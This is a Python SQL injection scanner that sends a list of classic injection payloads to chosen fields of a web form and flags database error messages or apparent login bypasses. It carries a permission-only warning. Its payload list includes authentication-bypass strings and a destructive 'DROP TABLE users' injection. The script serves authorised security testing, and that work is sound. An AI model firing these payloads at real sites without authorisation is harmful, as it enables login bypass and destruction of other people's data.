# SQL Injection Scanner
# Probes a web form for common SQLi patterns and reports which payloads
# triggered signs of a vulnerability (DB errors, unexpected login success, etc.)
# ONLY for use against targets you own or have explicit permission to test.

import requests
import threading
import time
import logging
from datetime import datetime

logging.basicConfig(
    filename="sqli_scan_results.log",
    level=logging.INFO,
    format="%(asctime)s - %(message)s"
)

# common SQL error fingerprints across different databases - if any of these
# show up in a response, it's a strong sign the input wasn't sanitized
SQL_ERROR_SIGNATURES = [
    "sql syntax",
    "mysql_fetch",
    "sqlite3.operationalerror",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "odbc sql server driver",
    "database error",
]

PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "admin'--",
    "' OR 1=1--",
    "'; DROP TABLE users--",
    "' UNION SELECT NULL--",
]

RATE_LIMIT_DELAY = 0.5  # seconds between requests - avoids hammering the target
results_lock = threading.Lock()
findings = []


def test_payload(url, field_name, other_fields, payload):
    data = dict(other_fields)
    data[field_name] = payload

    try:
        response = requests.post(url, data=data, timeout=5)
        body = response.text.lower()

        vulnerable_indicator = None

        # check for leaked SQL errors
        for signature in SQL_ERROR_SIGNATURES:
            if signature in body:
                vulnerable_indicator = f"SQL error signature found: '{signature}'"
                break

        # check for suspicious bypass success (e.g. logging in without real credentials)
        if "login successful" in body and payload != "":
            vulnerable_indicator = vulnerable_indicator or "Possible authentication bypass"

        with results_lock:
            if vulnerable_indicator:
                finding = {
                    "field": field_name,
                    "payload": payload,
                    "indicator": vulnerable_indicator,
                    "status_code": response.status_code,
                }
                findings.append(finding)
                print(f"[VULNERABLE] field='{field_name}' payload=\"{payload}\" -> {vulnerable_indicator}")
                logging.info(f"VULNERABLE - field={field_name} payload={payload} - {vulnerable_indicator}")
            else:
                logging.info(f"Safe - field={field_name} payload={payload} - no indicator found")

    except requests.exceptions.RequestException as e:
        with results_lock:
            print(f"[ERROR] Request failed for payload \"{payload}\": {e}")
            logging.error(f"Request failed - field={field_name} payload={payload} - {e}")


def scan_field(url, field_name, other_fields):
    print(f"\nTesting field: '{field_name}'")
    for payload in PAYLOADS:
        test_payload(url, field_name, other_fields, payload)
        time.sleep(RATE_LIMIT_DELAY)  # basic rate-limiting, one request at a time per field


def run_scan(url, fields_to_test):
    print(f"Starting SQL injection scan on {url}")
    print(f"Fields to test: {fields_to_test}")
    logging.info(f"--- New scan: {url} - fields: {fields_to_test} ---")

    threads = []
    for field in fields_to_test:
        # other fields get a harmless placeholder value while we fuzz this one
        other_fields = {f: "test" for f in fields_to_test if f != field}
        t = threading.Thread(target=scan_field, args=(url, field, other_fields))
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

    print("\n--- Scan complete ---")
    if findings:
        print(f"{len(findings)} potential vulnerability indicator(s) found. See sqli_scan_results.log for full details.")
        for f in findings:
            print(f"  - Field '{f['field']}' | Payload: {f['payload']} | {f['indicator']}")
    else:
        print("No vulnerability indicators found with the tested payloads.")


if __name__ == "__main__":
    print("=== SQL Injection Scanner ===")
    print("WARNING: Only run this against targets you own or have explicit permission to test.\n")

    target_url = input("Target URL (e.g., http://127.0.0.1:5000/login): ").strip()
    fields_input = input("Form field names to test, comma-separated (e.g., username,password): ").strip()
    fields_to_test = [f.strip() for f in fields_input.split(",") if f.strip()]

    run_scan(target_url, fields_to_test)